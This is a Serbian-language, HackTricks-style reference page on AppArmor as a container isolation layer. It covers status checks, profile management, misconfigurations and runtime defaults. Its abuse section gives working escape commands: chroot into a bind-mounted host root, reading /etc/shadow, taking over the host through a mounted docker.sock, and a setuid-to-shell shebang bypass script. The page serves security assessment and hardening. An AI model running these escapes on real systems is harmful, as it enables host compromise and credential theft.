# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

AppArmor je sistem **Mandatory Access Control** koji primenjuje ograničenja putem profila po programu. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva po korisniku i grupi, AppArmor omogućava kernelu da sprovede politiku vezanu za sam proces. U container okruženjima ovo je važno zato što workload može imati dovoljno tradicionalnih privilegija da pokuša neku radnju, a ipak bude odbijen zato što njegov AppArmor profil ne dozvoljava odgovarajuću putanju, mount, mrežno ponašanje ili korišćenje capability-a.

## Uloga u izolaciji kontejnera

Pregledi sigurnosti container-a često se zaustave na capabilities i seccomp, ali AppArmor i dalje ima značaj nakon tih provera. Zamislite container koji ima više privilegija nego što bi trebalo, ili workload kojem je zbog operativnih razloga bila potrebna još jedna capability. AppArmor i dalje može ograničiti pristup fajlovima, ponašanje mount-ovanja, mrežu i obrasce izvršavanja na načine koji zaustavljaju očigledan put zloupotrebe. Zato onemogućavanje AppArmor-a "samo da bi aplikacija radila" može tiho pretvoriti samo rizičnu konfiguraciju u onu koja je aktivno iskorišćiva.

## Lab

Da biste proverili da li je AppArmor aktivan na hostu, koristite:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Da biste videli pod kojim korisnikom se trenutno izvršava proces u kontejneru:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Razlika je poučna. U normalnom slučaju, proces bi trebalo da prikaže AppArmor kontekst povezan sa profilom koji je odabrao runtime. U slučaju unconfined, taj dodatni sloj ograničenja nestaje.

Takođe možete da proverite šta Docker smatra da je primenio:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker može primeniti podrazumevani ili prilagođeni AppArmor profil kada host to podržava. Podman se takođe može integrisati sa AppArmor-om na sistemima zasnovanim na AppArmor-u, iako na distribucijama koje preferiraju SELinux drugi MAC sistem često preuzme glavnu ulogu. Kubernetes može izložiti AppArmor politiku na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna Ubuntu-family system-container okruženja takođe široko koriste AppArmor.

Praktično, AppArmor nije "Docker feature". To je host-kernel funkcija koju više runtimes može da primeni. Ako host to ne podržava ili je runtime naređeno da radi unconfined, navodna zaštita zapravo nije prisutna.

Na hostovima sa AppArmor-om koji podržavaju Docker, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby-jevog AppArmor template-a i važan je jer objašnjava zašto neki capability-based PoC-i i dalje neuspevaju u podrazumevanom container-u. U širokim crtama, `docker-default` dozvoljava uobičajeno networking, zabranjuje upis u veliki deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da on nije opšta primitivna operacija za ispitivanje host-a. Razumevanje te osnovne postavke pomaže da se razlikuje "kontejner ima `CAP_SYS_ADMIN`" od "kontejner zaista može da iskoristi tu mogućnost protiv kernel interfejsa koji su mi bitni".

## Profile Management

AppArmor profili se obično čuvaju pod `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je zameniti kose crte u putanji izvršnog fajla tačkama. Na primer, profil za `/usr/bin/man` se obično čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je bitan i za odbranu i za procenu jer, kada poznate ime aktivnog profila, često možete brzo pronaći odgovarajući fajl na hostu.

Korisne komande za upravljanje na strani hosta uključuju:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Razlog zbog kojeg su ovi komandni nalozi važni u container-security reference је то што objašnjavaju kako se profili zapravo grade, učitavaju, prebacuju u complain mode i menjaju nakon promena u aplikaciji. Ako operater ima naviku da tokom rešavanja problema prebacuje profile u complain mode i zaboravi da vrati enforcement, kontejner može izgledati zaštićeno u dokumentaciji dok se u stvarности ponaša mnogo popustljivije.

### Kreiranje i ažuriranje profila

`aa-genprof` može posmatrati ponašanje aplikacije i pomoći da se interaktivno generiše profil:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` može generisati predložak profila koji kasnije može biti učitan pomoću `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kada se binarni fajl promeni i politika treba ažurirati, `aa-logprof` može reproducirati odbijanja pronađena u logovima i pomoći operateru da odluči da li da ih dozvoli ili odbije:
```bash
sudo aa-logprof
```
### Logs

AppArmor odbijanja su često vidljiva kroz `auditd`, syslog, ili alate kao što je `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ovo je korisno operativno i u ofanzivi. Branitelji ga koriste da usavrše profile. Napadači ga koriste da saznaju koji tačan put ili koja operacija se odbija i da li AppArmor predstavlja kontrolu koja blokira lanac exploita.

### Identifikovanje tačne datoteke profila

Kada runtime prikaže naziv određenog AppArmor profila za container, često je korisno mapirati to ime nazad na datoteku profila na disku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ovo je posebno korisno tokom pregleda na host strani jer premošćava jaz između "container kaže da radi pod profilom `lowpriv`" i "stvarna pravila se nalaze u ovom konkretnom fajlu koji može biti pregledan ili ponovo učitan".

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori ga često postave dok debuguju aplikaciju koja je otkazala zato što je profil ispravno blokirao nešto opasno ili neočekivano. Ako zastavica ostane u produkciji, čitav MAC sloj je praktično uklonjen.

Još jedan suptilan problem je pretpostavka da su bind mounts bezopasni zato što dozvole fajlova izgledaju normalno. Pošto je AppArmor zasnovan na putanjama (path-based), izlaganje host puteva pod alternativnim mount lokacijama može loše interagovati sa pravilima za putanje. Treća greška je zaboraviti da ime profila u config fajlu znači vrlo malo ako host kernel zapravo ne sprovodi AppArmor.

## Zloupotrebe

Kada AppArmor nije prisutan, operacije koje su ranije bile ograničene mogu iznenada postati moguće: čitanje osetljivih putanja preko bind mounts, pristup delovima procfs ili sysfs koji su trebali ostati teže dostupni, izvođenje mount-povezanih radnji ako capabilities/seccomp to takođe dopuštaju, ili korišćenje putanja koje bi profil normalno odbio. AppArmor je često mehanizam koji objašnjava zašto pokušaj eskalacije zasnovan na capabilities "na papiru treba da radi" ali ipak ne uspeva u praksi. Uklonite AppArmor, i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavni faktor koji sprečava path-traversal, bind-mount, ili mount-based abuse chain, prvi korak je obično uporediti šta postaje dostupno sa profilom i bez njega. Na primer, ako je host path montiran unutar container-a, počnite proverom da li možete da ga traversirate i pročitate:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ako kontejner takođe ima opasnu sposobnost kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova je da li AppArmor predstavlja kontrolu koja blokira mount operacije ili pristup osetljivim kernel fajl-sistemima:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
U okruženjima u kojima je host path već dostupan putem bind mount-a, gubitak AppArmor-a može takođe pretvoriti read-only information-disclosure issue u direktan pristup host fajlovima:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Poenta ovih komandi nije u tome da AppArmor sam stvori breakout. Već u tome da, kada se AppArmor ukloni, mnogi filesystem i mount-based putevi zloupotrebe postaju odmah testabilni.

### Full Example: AppArmor Disabled + Host Root Mounted

Ako container već ima host root bind-mounted na `/host`, uklanjanje AppArmor-a može pretvoriti blokiran filesystem abuse path u kompletan host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Kada se shell izvršava kroz host filesystem, workload je efektivno pobegao iz granica kontejnera:
```bash
id
hostname
cat /etc/shadow | head
```
### Potpun primer: AppArmor onemogućen + Runtime Socket

Ako je stvarna prepreka bila AppArmor oko runtime stanja, montirani socket može biti dovoljan za potpuni escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tačna putanja zavisi od mount point-a, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, i runtime API može pokrenuti host-kompromitujući container.

### Potpun primer: zaobilaženje bind-mount-a zasnovano na putanji

Pošto je AppArmor zasnovan na putanjama, zaštita `/proc/**` ne štiti automatski isti host procfs sadržaj kada je dostupan kroz drugačiju putanju:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Uticaj zavisi od toga šta je tačno montirano i da li alternativna putanja takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najočitijih razloga zašto AppArmor mora biti ocenjen zajedno sa rasporedom mount tačaka, a ne izolovano.

### Kompletan primer: Shebang Bypass

AppArmor politika ponekad cilja putanju interpretera na način koji ne uzima u potpunosti u obzir izvršavanje skripti kroz obradu shebang-a. Istorijski primer je uključivao korišćenje skripte čija prva linija pokazuje na ograničeni interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ovakav primer je važan kao podsetnik da se namera profila i stvarna semantika izvršavanja mogu razilaziti. Prilikom pregledanja AppArmor-a u container okruženjima, lanci interpretera i alternativni putevi izvršavanja zaslužuju posebnu pažnju.

## Provere

Cilj ovih provera je brzo odgovoriti na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen i da li je runtime zaista primenio profil na ovaj container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Zanimljivo ovde:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, workload ne koristi AppArmor ograničenje.
- Ako `aa-status` prikazuje da je AppArmor onemogućen ili nije učitan, svaki naziv profila u runtime konfiguraciji je uglavnom kozmetički.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani prilagođeni profil, to je često razlog zašto put zloupotrebe zasnovan na fajl-sistemu ili mount-ovima funkcioniše.

Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor-a omogućenim često pravi razliku između kontrolisanog izuzetka i mnogo šireg bezbednosnog propusta.

## Runtime Defaults

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Omogućen po defaultu na hostovima koji podržavaju AppArmor | Koristi `docker-default` AppArmor profil osim ako nije eksplicitno nadjačano | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisno od hosta | AppArmor je podržan preko `--security-opt`, ali tačan podrazumevani izbor zavisi od hosta/runtime-a i manje je univerzalan od dokumentovanog Docker `docker-default` profila | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije naveden, podrazumevano je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
| containerd / CRI-O under Kubernetes | Prati podršku čvora/runtime-a | Uobičajeni runtime-ovi koje Kubernetes podržava podržavaju AppArmor, ali stvarno sprovođenje i dalje zavisi od podrške čvora i podešavanja workload-a | Isto kao u redu za Kubernetes; direktna runtime konfiguracija takođe može potpuno zaobići AppArmor |

Za AppArmor, najvažnija varijabla često je **host**, ne samo runtime. Podešavanje profila u manifestu ne stvara ograničenje na čvoru gde AppArmor nije omogućen.
